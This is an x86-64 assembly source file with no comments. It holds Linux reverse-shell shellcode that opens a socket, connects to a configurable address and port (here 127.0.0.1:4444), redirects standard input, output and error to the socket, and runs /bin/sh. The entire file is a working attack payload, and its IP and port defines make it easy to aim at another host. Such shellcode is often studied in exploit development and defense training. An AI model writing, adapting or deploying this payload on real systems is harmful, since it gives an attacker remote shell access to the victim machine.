BITS 64
%define IP_A 127
%define IP_B 0
%define IP_C 0
%define IP_D 1
%define PORT 4444

GLOBAL _start
_start:
    mov     eax, 41
    mov     edi, 2
    mov     esi, 1
    xor     edx, edx
    syscall
    xchg    rax, rdi

    sub     rsp, 16
    mov     word [rsp], 2
    mov     ax, PORT
    xchg    al, ah
    mov     word [rsp+2], ax
    mov     byte [rsp+4], IP_A
    mov     byte [rsp+5], IP_B
    mov     byte [rsp+6], IP_C
    mov     byte [rsp+7], IP_D
    xor     rax, rax
    mov     [rsp+8], rax

    mov     eax, 42
    mov     rsi, rsp
    mov     dl, 16
    syscall

    xor     esi, esi
.duploop:
    mov     eax, 33
    syscall
    inc     esi
    cmp     esi, 3
    jne     .duploop

    xor     eax, eax
    push    rax
    mov     rbx, 0x68732f2f6e69622f
    push    rbx
    mov     rdi, rsp
    xor     esi, esi
    xor     edx, edx
    mov     al, 59
    syscall
    mov     al, 60
    xor     edi, edi
    syscall
